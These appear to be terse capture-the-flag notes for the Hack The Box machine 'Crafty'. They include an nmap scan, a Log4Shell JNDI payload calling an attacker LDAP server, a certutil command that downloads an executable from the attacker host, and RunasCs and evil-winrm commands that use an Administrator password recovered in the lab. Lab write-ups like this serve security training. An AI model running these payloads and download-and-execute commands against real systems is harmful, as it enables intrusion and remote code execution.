## NMAP


### IP - 10.10.11.249

${jndi:ldap://10.10.14.107:1389/a}

certutil -urlcache -f http://10.10.14.107:4245/expl.exe c:\Users\svc_minecraft\server\logs\expl.exe


.\RunasCs.exe Administrator s67u84zKq8IXw expl.exe

Nmap scan report for crafty.htb (10.10.11.249)
Host is up (0.46s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Crafty - Official Website
| http-methods: 
|_  Potentially risky methods: TRACE
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100) ( CVE-2021–44228 )
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 527.64 seconds




### Tools Link: 

log4j: https://github.com/kozmer/log4j-shell-poc

requirements for log4j

```
#Copy in the '/log4j-shell-poc' directory
wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz

tar -xf jdk-8u181-linux-x64.tar.gz #To extract

mv jdk1.8.0_181 jdk1.8.0_20 #poc.py is searching for this filename

````

### Minecraft-client networking library in Python

https://github.com/ammaraskar/pyCraft?source=post_page-----316a735a306d--------------------------------


### Let’s try remoting in with evil-winrm.

evil-winrm -i <target IP> -u Administrator -p <password>
evil-winrm -i 10.10.11.249 -u Administrator -p 's67...'

### RunasCs - Csharp and open version of windows builtin runas.exe

https://github.com/antonioCoco/RunasCs

There is a tool called ‘RunasCs’ which will allow us to run processes with different permissions that the ones we currently have. The goal is to initiate an Administrator shell from our current user ‘svc_minecraft’.

### .\RunasCs.exe Administrator s67...pass expl2.exe


https://www.hackthebox.com/achievement/machine/296157/587
